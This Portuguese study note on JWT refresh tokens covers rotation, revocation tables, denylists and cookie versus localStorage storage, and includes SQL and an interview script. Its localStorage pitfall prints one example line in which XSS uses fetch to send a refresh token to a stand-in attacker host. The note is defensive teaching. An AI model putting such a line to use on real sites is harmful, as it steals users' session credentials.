---
title: "Refresh tokens e revogação de token"
created: 2026-06-10
updated: 2026-06-10
type: concept
progress: backlog
status: seedling
publish: true
fase: magus
tags:
  - java
  - seguranca
  - magus
  - jwt
  - oauth2
aliases:
  - "refresh tokens"
  - "revogação de token"
---

# Refresh tokens e revogação de token

> [!abstract] TL;DR
> O JWT é **stateless** — o servidor valida só a assinatura, sem consultar banco. Isso é ótimo para escala, mas **torna a revogação difícil**: um token assinado vale até expirar, e não há um botão de "invalidar agora". A solução padrão é um **par de tokens**: um *access token* JWT de vida curta (~15min) que carrega as autorizações, e um *refresh token* **server-side e opaco** (um UUID, não um JWT) guardado em tabela. A cada uso do refresh, emite-se um novo e **revoga-se o anterior** (rotação). Logout, troca de senha ou suspeita de roubo? Marca o refresh como revogado no banco — revogação imediata, sem quebrar o stateless do access token.

## O que é

Um **refresh token** é uma credencial de longa duração cuja única função é **obter novos access tokens** sem forçar o usuário a digitar a senha de novo. **Revogação de token** é a capacidade de invalidar uma credencial antes da sua expiração natural.

Os dois andam juntos por um motivo: o access token, sendo um JWT autocontido, é praticamente irrevogável durante sua janela de validade. Em vez de tentar revogar o irrevogável, o padrão move a revogabilidade para o refresh token — que, por ser consultado no servidor a cada uso, pode ser cancelado a qualquer instante.

Para a anatomia do JWT em si (header, payload, assinatura, validação), veja [[03-Dominios/Java/Segurança/08 - JWT — estrutura, assinatura e validação|JWT]]; aqui o foco é o ciclo de vida e a revogação.

## Por que importa

Um access token longo (digamos, 24h) é cômodo, mas se vaza, o atacante tem 24 horas de acesso e **você não tem como cortar**. Reduzir a validade para 15 minutos limita o estrago — mas obrigaria o usuário a relogar a cada 15 minutos, o que é inviável.

O par access + refresh resolve a tensão: o access token é curto (estrago limitado se vazar), e o refresh token, embora longo, é **revogável**. O resultado é a melhor das duas pontas — escala stateless na validação do access token, controle stateful na renovação.

Esse é também o desenho recomendado pela [RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700) (best practices de OAuth 2.0): para clientes públicos, refresh tokens **DEVEM** ser *sender-constrained* ou usar **rotação**.

## Como funciona

### O trade-off: JWT é stateless, mas isso torna a revogação difícil

A validação de um JWT é puramente local: o servidor recalcula a assinatura com a chave e confere `exp`. Não há ida ao banco — por isso escala. Mas o reverso é cruel: **não existe estado de servidor para mudar e dizer "esse token agora é inválido"**.

Um JWT roubado é como uma carta com selo válido: o carteiro entrega até o selo vencer, e ninguém consegue "cancelar o selo" depois de impresso. Revogar um JWT exige reintroduzir estado — exatamente o que o JWT tentava evitar.

### O par: access token curto (~15min) + refresh token server-side (UUID, não JWT)

O desenho que reconcilia escala e revogação:

- **Access token** — JWT, vida curta (5 a 15 minutos), carrega claims (sub, roles, scopes). Validado statelessly. Se vazar, expira logo.
- **Refresh token** — string **opaca** (um UUID aleatório), longa duração (dias a semanas), **sem significado por si só**. Guardado no servidor numa tabela. Validá-lo é uma consulta ao banco — e é justamente essa consulta que abre a porta para revogação.

A chave é que o refresh token **não é um JWT**: é opaco. Não carrega claims, não é autocontido. O servidor precisa consultá-lo para saber se é válido — e essa dependência é uma feature, não um bug.

### Rotação: novo refresh a cada uso, o antigo é revogado

**Refresh token rotation**: toda vez que o cliente troca um refresh por um novo access, o servidor também emite um **novo refresh token** e **revoga o anterior**. O refresh antigo nunca mais funciona.

Isso encolhe a janela de exposição: um refresh roubado só vale até o próximo uso legítimo. Melhor ainda, habilita **detecção de roubo**: se um refresh **já revogado** for apresentado, é sinal de que duas partes têm o mesmo token (cliente legítimo + atacante). A resposta padrão é **revogar toda a família** de tokens daquele usuário, forçando relogin.

A RFC 9700 (Seção 4.14) trata rotação e *sender-constraining* (mTLS, DPoP) como as duas defesas centrais para refresh tokens.

### Revogação imediata: tabela refresh_tokens (logout / troca de senha)

Como o refresh vive no banco, revogar é um `UPDATE`. Os gatilhos clássicos:

- **Logout** — marca o refresh atual como `revoked = true`. O access token ainda vale por seus minutinhos finais, mas nenhum novo será emitido.
- **Troca/reset de senha** — revoga **todos** os refresh tokens do usuário. Sessões antigas morrem na próxima renovação.
- **Suspeita de comprometimento** — revoga a família inteira.

O efeito é praticamente imediato: o atacante perde a capacidade de renovar, e o access token em mãos expira em minutos.

### Blacklist de access token quebra o stateless (o trade-off honesto)

E se você precisar matar um access token **agora**, dentro da sua janela de validade? A única saída é uma **denylist** (blacklist): uma tabela de tokens revogados que o servidor consulta **a cada requisição**.

Seja honesto sobre o custo: isso **reverte o stateless**. Cada validação volta a tocar o banco (ou um cache tipo Redis), exatamente o que o JWT economizava. O OWASP descreve essa denylist como recurso de logout, guardando o **hash SHA-256** do token, não o token cru.

O caminho pragmático é evitar precisar disso: access tokens **tão curtos** (5 a 15min) que a janela de exposição já é aceitável, deixando toda a revogabilidade no refresh. A denylist fica reservada para cenários de alto risco onde minutos importam.

### Armazenamento: HttpOnly Secure SameSite cookie vs localStorage (XSS)

Onde o cliente guarda o refresh token define quem consegue roubá-lo.

- **`localStorage` / `sessionStorage`** — acessível via JavaScript. Qualquer falha de **XSS** lê o token e o exfiltra. O OWASP só tolera localStorage se acompanhado de validade curta e rotação.
- **Cookie `HttpOnly` + `Secure` + `SameSite`** — `HttpOnly` o esconde do JavaScript (XSS não lê), `Secure` exige HTTPS, `SameSite` mitiga CSRF. É a opção preferida para o refresh token.

O OWASP reforça isso na técnica de **token sidejacking**: amarrar o token a um valor secreto guardado em cookie endurecido (HttpOnly, Secure, SameSite, Max-Age), de forma que um JWT roubado isolado seja inútil sem o cookie acompanhante.

## Na prática

Fluxo de login e renovação:

```text
1. Login (POST /auth/login, user + senha)
   <- 200 { access_token (JWT, ~15min), refresh_token (UUID opaco) }
      Idealmente o refresh vai num cookie HttpOnly Secure SameSite.

2. Requisições normais usam o access token:
   GET /api/recurso
   Authorization: Bearer <access_token JWT>

3. Access token expirou? Renova com o refresh:
   POST /auth/refresh   (refresh_token no corpo ou no cookie)
   <- 200 { access_token (novo JWT), refresh_token (NOVO UUID) }
      Servidor REVOGA o refresh antigo e emite um novo (rotação).

4. Refresh já revogado foi apresentado?
   <- 401 + revoga a família inteira (sinal de roubo).

5. Logout (POST /auth/logout):
   Servidor marca refresh_tokens.revoked = true.
   Nenhum novo access será emitido; o atual expira em minutos.
```

Esquema neutro da tabela de refresh tokens (guardar o **hash**, nunca o token cru):

```sql
CREATE TABLE refresh_tokens (
    id          BIGINT       PRIMARY KEY,
    token_hash  VARCHAR(64)  NOT NULL UNIQUE,  -- SHA-256 do token opaco
    user_id     BIGINT       NOT NULL,
    expires_at  TIMESTAMP    NOT NULL,
    revoked     BOOLEAN      NOT NULL DEFAULT FALSE,
    created_at  TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP
);

-- Revogar no logout:
UPDATE refresh_tokens SET revoked = TRUE WHERE token_hash = ?;

-- Revogar todas as sessões (troca de senha):
UPDATE refresh_tokens SET revoked = TRUE WHERE user_id = ?;

-- Validar na renovação:
SELECT user_id FROM refresh_tokens
WHERE token_hash = ? AND revoked = FALSE AND expires_at > CURRENT_TIMESTAMP;
```

## Armadilhas

### (1) Refresh token como JWT

Tornar o refresh token um JWT autocontido devolve o problema original: ele vira **stateless e irrevogável** durante sua validade — que é longa. A revogação "difícil" volta com força.

```text
RUIM:  refresh_token = JWT assinado, válido por 30 dias, sem registro no banco
       -> roubado, funciona por 30 dias, impossível revogar
```

**Fix**: o refresh token deve ser **opaco** (UUID aleatório) e existir **server-side** numa tabela. Validá-lo é consultar o banco — e é essa consulta que permite revogar a qualquer momento.

### (2) Refresh token em `localStorage`

`localStorage` é legível por qualquer JavaScript da página. Uma única brecha de **XSS** (um script de terceiro comprometido, um campo refletido) lê o token e o envia para o atacante.

```text
RUIM:  localStorage.setItem('refresh_token', token);
       // qualquer XSS faz: fetch(evil, { body: localStorage.refresh_token })
```

**Fix**: guarde o refresh num cookie `HttpOnly; Secure; SameSite=Strict`. `HttpOnly` o torna invisível ao JavaScript, então XSS não o alcança; `Secure` força HTTPS; `SameSite` reduz CSRF.

### (3) Não rotacionar o refresh

Sem rotação, o mesmo refresh token vive por toda sua validade longa. Roubado, vale **dias ou semanas** — e você nem percebe, porque o legítimo continua funcionando em paralelo.

```text
RUIM:  POST /auth/refresh -> novo access, MESMO refresh de sempre
       -> token roubado coexiste indefinidamente com o legítimo
```

**Fix**: rotacione — cada `/auth/refresh` emite um **novo** refresh e revoga o anterior. Se um refresh já revogado reaparecer, é sinal de roubo: revogue a **família inteira** e force relogin.

## Em entrevista

### Frase pronta (inglês)

> JWTs are stateless, which is great for scale but makes revocation hard — a signed token stays valid until it expires, and there is no built-in kill switch. The standard fix is a token pair: a short-lived access token, around fifteen minutes, plus an opaque, server-side refresh token stored in a database. I rotate the refresh token on every use — issuing a new one and revoking the previous — so a stolen refresh has a tiny window and replaying a revoked one signals theft. On logout or password change I just flag the refresh as revoked in the table, which gives immediate revocation without breaking the stateless validation of the access token. I keep the refresh token in an HttpOnly, Secure, SameSite cookie so XSS can't read it.

### Vocabulário

| Termo (inglês)            | Tradução / sentido                                              |
| ------------------------- | -------------------------------------------------------------- |
| stateless validation      | validação sem estado — só confere a assinatura, sem banco      |
| token revocation          | revogação de token — invalidar antes do `exp`                  |
| short-lived access token  | access token de vida curta (~15min)                            |
| opaque refresh token      | refresh token opaco — UUID sem significado, server-side        |
| refresh token rotation    | rotação — novo refresh a cada uso, revoga o anterior           |
| token denylist/blacklist  | lista de tokens revogados consultada por requisição            |
| HttpOnly cookie           | cookie inacessível ao JavaScript (defesa contra XSS)           |
| sender-constrained token  | token amarrado ao cliente (mTLS, DPoP)                         |

## Veja também

- [[03-Dominios/Java/Segurança/08 - JWT — estrutura, assinatura e validação|JWT]]
- [[03-Dominios/Java/Segurança/12 - OAuth2 e OIDC Client e os grant types|OAuth2 e OIDC Client]]
- [[03-Dominios/Java/Segurança/16 - OWASP Top 10 no contexto Java|OWASP Top 10 no contexto Java]]
- [[03-Dominios/Java/Segurança/index|Segurança (MOC do galho)]]
- [[03-Dominios/Java/index|Trilha Java]]
- [[03-Dominios/Java/Dicionário de Java]]

## Referências

- OWASP Cheat Sheet Series — *JSON Web Token for Java Cheat Sheet* (token revocation, token sidejacking, secure storage): https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- RFC 9700 — *Best Current Practice for OAuth 2.0 Security* (refresh token rotation, sender-constraining, Seção 2.2.2 e 4.14): https://datatracker.ietf.org/doc/html/rfc9700
- RFC 6749 — *The OAuth 2.0 Authorization Framework* (refresh tokens): https://datatracker.ietf.org/doc/html/rfc6749
